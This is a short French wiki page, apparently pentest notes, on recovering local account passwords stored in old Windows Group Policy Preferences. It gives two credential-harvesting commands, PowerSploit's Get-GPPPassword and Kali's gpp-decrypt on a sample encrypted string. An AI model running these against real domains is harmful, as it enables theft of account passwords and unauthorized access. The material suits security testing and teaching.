---
title: Group Policy Preferences
permalink: /Group_Policy_Preferences/
---

# Group Policy Preferences
Les anciennes versions de Windows Server permettent de définir des mots de passes de comptes locaux via des GPO. Ces mots de passe peuvent être récupérés par n'importe quel utilisateur du domaine.

Powersploit posséde une fonction qui va regarder les GPO et les parser pour identifier ce problème:
```
PS C:\> Get-GPPPassword -Server EXAMPLE.COM
```

Alternativement il y a un tool sous Kali:
```
root@kali:~# gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
